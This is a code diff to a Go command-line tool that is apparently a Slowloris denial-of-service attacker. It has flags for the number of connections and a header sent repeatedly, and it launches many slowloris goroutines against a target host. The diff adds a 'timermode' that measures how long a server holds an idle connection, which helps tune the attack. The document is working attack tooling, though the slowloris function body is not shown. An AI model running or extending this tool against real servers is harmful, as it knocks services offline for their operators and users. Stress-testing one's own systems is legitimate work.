@@ -35,6 +35,7 @@ func main() {
 		target         string
 		https          bool
 		dosHeader      string
+		timermode      bool
 	)
 
 	flag.Usage = usage
@@ -46,6 +47,7 @@ func main() {
 	flag.StringVar(&userAgent, "useragent", defaultUserAgent, "User-Agent header of the request")
 	flag.StringVar(&dosHeader, "dosHeader", defaultDOSHeader, "Header to send repeatedly")
 	flag.BoolVar(&https, "https", false, "Use HTTPS")
+	flag.BoolVar(&timermode, "timermode", false, "Measure the timeout of the server. connections flag is omitted")
 	flag.Parse()
 
 	if len(flag.Args()) == 0 {
@@ -65,8 +67,12 @@ func main() {
 		}
 	}
 
-	for i := 0; i < numConnections; i++ {
-		go slowloris(target, dosHeader, method, resource, interval, timeout, https)
+	if timermode {
+		go timer(target, method, resource, timeout, https)
+	} else {
+		for i := 0; i < numConnections; i++ {
+			go slowloris(target, dosHeader, method, resource, interval, timeout, https)
+		}
 	}
 
 loop:
@@ -93,6 +99,32 @@ func usage() {
 	fmt.Printf("  %s -useragent=\"some user-agent string\" -https -connections=500 192.168.0.1\n", os.Args[0])
 	fmt.Println("")
 	fmt.Println(legalDisclaimer)
+}
+
+func timer(target, method, resource string, timeout int, https bool) {
+	fmt.Printf("Timer mode activated. Use Ctrl+C to terminate the program.\n")
+	for {
+		d := getTimeout(target, method, resource, timeout, https)
+		fmt.Printf("Server closed the connection after %.2f seconds\n", d.Seconds())
+	}
+}
+
+func getTimeout(target, method, resource string, timeout int, https bool) time.Duration {
+	start := time.Now()
+
+	conn, err := openConnection(target, timeout, https)
+	if err != nil {
+		fmt.Println("FATAL: " + err.Error())
+		os.Exit(-1)
+	}
+
+	trash := make([]byte, 1024)
+	_, err = conn.Read(trash)
+	if err != nil {
+		return time.Now().Sub(start)
+	}
+
+	panic("This should not happen!")
 }
 
 func slowloris(target, dosHeader, method, resource string, interval, timeout int, https bool) {
